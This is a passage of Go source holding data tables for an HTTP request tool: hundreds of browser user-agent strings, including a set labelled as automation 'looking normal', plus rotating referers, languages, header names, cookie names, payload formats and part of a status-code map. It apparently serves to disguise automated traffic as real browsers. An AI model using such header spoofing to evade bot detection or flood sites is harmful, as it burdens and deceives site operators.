		"Mozilla/5.0 (Macintosh; Apple M4 Mac OS X 15_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36",
		"Mozilla/5.0 (Macintosh; Apple M4 Mac OS X 15_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36",
		// ======================== LINUX DISTROS CHROME ========================
		"Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36",
		"Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36",
		"Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36",
		"Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
		"Mozilla/5.0 (X11; Debian; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36",
		"Mozilla/5.0 (X11; Debian; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36",
		"Mozilla/5.0 (X11; Debian; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36",
		"Mozilla/5.0 (X11; Linux aarch64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36",
		"Mozilla/5.0 (X11; Linux aarch64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36",
		"Mozilla/5.0 (X11; Linux aarch64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36",
		// ======================== LINUX DISTROS FIREFOX ========================
		"Mozilla/5.0 (X11; Debian; Linux x86_64; rv:138.0) Gecko/20100101 Firefox/138.0",
		"Mozilla/5.0 (X11; Debian; Linux x86_64; rv:137.0) Gecko/20100101 Firefox/137.0",
		"Mozilla/5.0 (X11; Debian; Linux x86_64; rv:136.0) Gecko/20100101 Firefox/136.0",
		"Mozilla/5.0 (X11; Fedora; Linux x86_64; rv:136.0) Gecko/20100101 Firefox/136.0",
		"Mozilla/5.0 (X11; Fedora; Linux x86_64; rv:135.0) Gecko/20100101 Firefox/135.0",
		"Mozilla/5.0 (X11; Linux aarch64; rv:138.0) Gecko/20100101 Firefox/138.0",
		"Mozilla/5.0 (X11; Linux aarch64; rv:137.0) Gecko/20100101 Firefox/137.0",
		"Mozilla/5.0 (X11; Linux aarch64; rv:136.0) Gecko/20100101 Firefox/136.0",
		"Mozilla/5.0 (X11; Arch Linux; Linux x86_64; rv:138.0) Gecko/20100101 Firefox/138.0",
		"Mozilla/5.0 (X11; Arch Linux; Linux x86_64; rv:137.0) Gecko/20100101 Firefox/137.0",
		// ======================== FIREFOX ESR ========================
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:128.0) Gecko/20100101 Firefox/128.0",
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:115.0) Gecko/20100101 Firefox/115.0",
		"Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0",
		"Mozilla/5.0 (X11; Linux x86_64; rv:115.0) Gecko/20100101 Firefox/115.0",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:128.0) Gecko/20100101 Firefox/128.0",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:115.0) Gecko/20100101 Firefox/115.0",
		// ======================== MISC CHROME VERSIONS (FILL GAPS) ========================
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36",
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36",
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36",
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36",
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36",
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36",
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36",
		"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
		"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36",
		"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36",
		"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36",
		"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36",
		// ======================== MISC FIREFOX VERSIONS ========================
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0",
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:119.0) Gecko/20100101 Firefox/119.0",
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:118.0) Gecko/20100101 Firefox/118.0",
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:117.0) Gecko/20100101 Firefox/117.0",
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:116.0) Gecko/20100101 Firefox/116.0",
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:115.0) Gecko/20100101 Firefox/115.0",
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:114.0) Gecko/20100101 Firefox/114.0",
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:113.0) Gecko/20100101 Firefox/113.0",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:120.0) Gecko/20100101 Firefox/120.0",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:119.0) Gecko/20100101 Firefox/119.0",
		"Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0",
		"Mozilla/5.0 (X11; Linux x86_64; rv:119.0) Gecko/20100101 Firefox/119.0",
		// ======================== MISC EDGE VERSIONS ========================
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36 Edg/121.0.0.0",
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36 Edg/119.0.0.0",
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36 Edg/118.0.0.0",
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36 Edg/117.0.0.0",
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36 Edg/116.0.0.0",
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36 Edg/115.0.0.0",
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36 Edg/114.0.0.0",
		// ======================== MISC OLDER SAFARI ========================
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 12_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.2 Safari/605.1.15",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 12_2) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Safari/605.1.15",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 12_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Safari/605.1.15",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 11_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.6 Safari/605.1.15",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 11_5) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.5 Safari/605.1.15",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 11_4) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.4 Safari/605.1.15",
		// ======================== OLDER iOS ========================
		"Mozilla/5.0 (iPhone; CPU iPhone OS 16_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Mobile/15E148 Safari/604.1",
		"Mozilla/5.0 (iPhone; CPU iPhone OS 16_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.4 Mobile/15E148 Safari/604.1",
		"Mozilla/5.0 (iPhone; CPU iPhone OS 16_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.3 Mobile/15E148 Safari/604.1",
		"Mozilla/5.0 (iPhone; CPU iPhone OS 16_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.2 Mobile/15E148 Safari/604.1",
		"Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1",
		"Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Mobile/15E148 Safari/604.1",
		"Mozilla/5.0 (iPhone; CPU iPhone OS 15_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.7 Mobile/15E148 Safari/604.1",
		"Mozilla/5.0 (iPhone; CPU iPhone OS 15_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.6 Mobile/15E148 Safari/604.1",
		"Mozilla/5.0 (iPad; CPU OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1",
		"Mozilla/5.0 (iPad; CPU OS 16_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Mobile/15E148 Safari/604.1",
		"Mozilla/5.0 (iPad; CPU OS 16_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.4 Mobile/15E148 Safari/604.1",
		"Mozilla/5.0 (iPad; CPU OS 15_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.7 Mobile/15E148 Safari/604.1",
		// ======================== OLDER ANDROID CHROME ========================
		"Mozilla/5.0 (Linux; Android 13; SM-S916B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Mobile Safari/537.36",
		"Mozilla/5.0 (Linux; Android 13; SM-S911B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Mobile Safari/537.36",
		"Mozilla/5.0 (Linux; Android 13; SM-A546B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Mobile Safari/537.36",
		"Mozilla/5.0 (Linux; Android 13; SM-A346B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Mobile Safari/537.36",
		"Mozilla/5.0 (Linux; Android 13; Pixel 7 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Mobile Safari/537.36",
		"Mozilla/5.0 (Linux; Android 13; Pixel 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Mobile Safari/537.36",
		"Mozilla/5.0 (Linux; Android 13; Pixel 6 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Mobile Safari/537.36",
		"Mozilla/5.0 (Linux; Android 13; Pixel 6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Mobile Safari/537.36",
		"Mozilla/5.0 (Linux; Android 13; OnePlus 11) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Mobile Safari/537.36",
		"Mozilla/5.0 (Linux; Android 13; CPH2451) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Mobile Safari/537.36",
		"Mozilla/5.0 (Linux; Android 13; 22101316G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Mobile Safari/537.36",
		"Mozilla/5.0 (Linux; Android 13; M2101K6G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Mobile Safari/537.36",
		"Mozilla/5.0 (Linux; Android 12; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
		"Mozilla/5.0 (Linux; Android 12; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Mobile Safari/537.36",
		"Mozilla/5.0 (Linux; Android 12; SM-A536B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Mobile Safari/537.36",
		"Mozilla/5.0 (Linux; Android 12; Pixel 6 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
		"Mozilla/5.0 (Linux; Android 12; Pixel 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Mobile Safari/537.36",
		"Mozilla/5.0 (Linux; Android 12; moto g power (2022)) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Mobile Safari/537.36",
		"Mozilla/5.0 (Linux; Android 12; motorola edge 30) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Mobile Safari/537.36",
		"Mozilla/5.0 (Linux; Android 11; SM-A515F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Mobile Safari/537.36",
		"Mozilla/5.0 (Linux; Android 11; SM-A325F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Mobile Safari/537.36",
		"Mozilla/5.0 (Linux; Android 11; Redmi Note 10 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Mobile Safari/537.36",
		"Mozilla/5.0 (Linux; Android 11; Redmi Note 9 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36",
		// ======================== WINDOWS OLDER NT VERSIONS ========================
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36",
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36",
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36",
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36",
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36",
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36",
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36",
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36",
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:112.0) Gecko/20100101 Firefox/112.0",
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:111.0) Gecko/20100101 Firefox/111.0",
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:110.0) Gecko/20100101 Firefox/110.0",
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/109.0",
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:108.0) Gecko/20100101 Firefox/108.0",
		// ======================== HEADLESS / AUTOMATION LOOKING NORMAL ========================
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.6778.69 Safari/537.36",
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.6723.117 Safari/537.36",
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.6668.100 Safari/537.36",
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.6613.137 Safari/537.36",
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.6533.119 Safari/537.36",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.6778.69 Safari/537.36",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.6723.117 Safari/537.36",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.6668.100 Safari/537.36",
		"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.6778.69 Safari/537.36",
		"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.6723.117 Safari/537.36",
		// ======================== WEBVIEW VARIANTS ========================
		"Mozilla/5.0 (Linux; Android 15; SM-S928B; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/131.0.0.0 Mobile Safari/537.36",
		"Mozilla/5.0 (Linux; Android 14; SM-S918B; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/130.0.0.0 Mobile Safari/537.36",
		"Mozilla/5.0 (Linux; Android 14; Pixel 8; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/131.0.0.0 Mobile Safari/537.36",
		"Mozilla/5.0 (Linux; Android 14; OnePlus 12; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/130.0.0.0 Mobile Safari/537.36",
		"Mozilla/5.0 (Linux; Android 13; SM-A546B; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/129.0.0.0 Mobile Safari/537.36",
		"Mozilla/5.0 (Linux; Android 13; Pixel 7 Pro; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/128.0.0.0 Mobile Safari/537.36",
		// ======================== SILK BROWSER (FIRE TABLETS) ========================
		"Mozilla/5.0 (Linux; Android 11; KFONWI) AppleWebKit/537.36 (KHTML, like Gecko) Silk/131.3.1 like Chrome/131.0.0.0 Safari/537.36",
		"Mozilla/5.0 (Linux; Android 11; KFTRWI) AppleWebKit/537.36 (KHTML, like Gecko) Silk/131.3.1 like Chrome/131.0.0.0 Safari/537.36",
		"Mozilla/5.0 (Linux; Android 11; KFMAWI) AppleWebKit/537.36 (KHTML, like Gecko) Silk/130.2.1 like Chrome/130.0.0.0 Safari/537.36",
		"Mozilla/5.0 (Linux; Android 9; KFMEWI) AppleWebKit/537.36 (KHTML, like Gecko) Silk/129.4.1 like Chrome/129.0.0.0 Safari/537.36",
		// ======================== WHALE BROWSER (NAVER) ========================
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36 Whale/4.30.0.0",
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36 Whale/4.29.0.0",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36 Whale/4.30.0.0",
		// ======================== ARC BROWSER ========================
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36 Arc/1.78.0",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 Arc/1.77.0",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36 Arc/1.76.0",
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36 Arc/1.78.0",
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 Arc/1.77.0",
		// ======================== DUCKDUCKGO BROWSER ========================
		"Mozilla/5.0 (Linux; Android 15; SM-S928B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Mobile DuckDuckGo/5 Safari/537.36",
		"Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Mobile DuckDuckGo/5 Safari/537.36",
		"Mozilla/5.0 (iPhone; CPU iPhone OS 18_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.3 Mobile/15E148 DuckDuckGo/7 Safari/605.1.15",
		"Mozilla/5.0 (iPhone; CPU iPhone OS 18_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.2 Mobile/15E148 DuckDuckGo/7 Safari/605.1.15",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 DuckDuckGo/7 Safari/605.1.15",
		// ======================== HUAWEI BROWSER ========================
		"Mozilla/5.0 (Linux; Android 12; NOH-AN00) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.88 HuaweiBrowser/14.0.0.321 Mobile Safari/537.36",
		"Mozilla/5.0 (Linux; Android 12; ELS-AN00) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.88 HuaweiBrowser/14.0.0.321 Mobile Safari/537.36",
		"Mozilla/5.0 (Linux; Android 10; JNY-LX1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.166 HuaweiBrowser/13.0.0.303 Mobile Safari/537.36",
		// ======================== MIUI BROWSER ========================
		"Mozilla/5.0 (Linux; U; Android 14; en-us; 23127PN0CG Build/UKQ1.231003.002) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/131.0.0.0 Mobile Safari/537.36 XiaoMi/MiuiBrowser/19.3.0",
		"Mozilla/5.0 (Linux; U; Android 13; en-us; 22101316G Build/TP1A.220624.014) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/128.0.0.0 Mobile Safari/537.36 XiaoMi/MiuiBrowser/18.8.0",
		// ======================== MISC WINDOWS 11 CHROME BUILDS ========================
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.6698.44 Safari/537.36",
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.6650.92 Safari/537.36",
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.6612.53 Safari/537.36",
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.6574.80 Safari/537.36",
		// ======================== RANDOM OLDER COMBOS ========================
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.127 Safari/537.36",
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.84 Safari/537.36",
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.127 Safari/537.36",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.84 Safari/537.36",
		"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.127 Safari/537.36",
		"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.84 Safari/537.36",
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:100.0) Gecko/20100101 Firefox/100.0",
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:99.0) Gecko/20100101 Firefox/99.0",
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:98.0) Gecko/20100101 Firefox/98.0",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:100.0) Gecko/20100101 Firefox/100.0",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:99.0) Gecko/20100101 Firefox/99.0",
		"Mozilla/5.0 (X11; Linux x86_64; rv:100.0) Gecko/20100101 Firefox/100.0",
		"Mozilla/5.0 (X11; Linux x86_64; rv:99.0) Gecko/20100101 Firefox/99.0",
	}
	languages = []string{
		"en-US,en;q=0.9", "en-GB,en;q=0.8", "fr-FR,fr;q=0.9", "es-ES,es;q=0.9", "de-DE,de;q=0.9",
		"ja-JP,ja;q=0.9", "ko-KR,ko;q=0.9", "zh-CN,zh;q=0.8", "ru-RU,ru;q=0.7", "pt-BR,pt;q=0.7",
		"it-IT,it;q=0.6", "nl-NL,nl;q=0.5",
	}
	referers = []string{
		"https://www.google.com/", "https://www.bing.com/", "https://duckduckgo.com/", "https://www.yahoo.com/",
		"https://www.baidu.com/", "https://www.yandex.ru/", "https://t.co/", "https://www.facebook.com/",
		"https://www.instagram.com/", "https://www.reddit.com/",
	}
	accepts         = []string{"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8", "application/json, text/plain, */*"}
	acceptEncodings = []string{"gzip, deflate, br", "gzip, deflate"}
	customHeaders   = []string{"X-Requested-With", "Cache-Control", "Pragma", "DNT", "X-Purpose", "Upgrade-Insecure-Requests"}
	cookieNames     = []string{"sessionid", "userid", "token", "visit", "pref"}
	contentTypes    = []string{"application/json", "application/x-www-form-urlencoded", "text/plain"}
	payloadFormats  = []string{"json", "form", "plain"}
)

var statusCodeDescriptions = map[int]string{
	100: "Continue", 101: "Switching Protocols", 102: "Processing", 103: "Early Hints",
	200: "OK", 201: "Created", 202: "Accepted", 203: "Non-Authoritative Information",
	204: "No Content", 205: "Reset Content", 206: "Partial Content", 207: "Multi-Status",
	208: "Already Reported", 218: "This is fine (Apache)", 226: "IM Used",
	300: "Multiple Choices", 301: "Moved Permanently", 302: "Found", 303: "See Other",
	304: "Not Modified", 305: "Use Proxy", 306: "Switch Proxy", 307: "Temporary Redirect", 308: "Permanent Redirect",
	400: "Bad Request", 401: "Unauthorized", 402: "Payment Required", 403: "Forbidden",
	404: "Not Found", 405: "Method Not Allowed", 406: "Not Acceptable", 407: "Proxy Authentication Required",
	408: "Request Timeout", 409: "Conflict", 410: "Gone", 411: "Length Required",
	412: "Precondition Failed", 413: "Payload Too Large", 414: "URI Too Long", 415: "Unsupported Media Type",
	416: "Range Not Satisfiable", 417: "Expectation Failed", 418: "I'm a teapot",
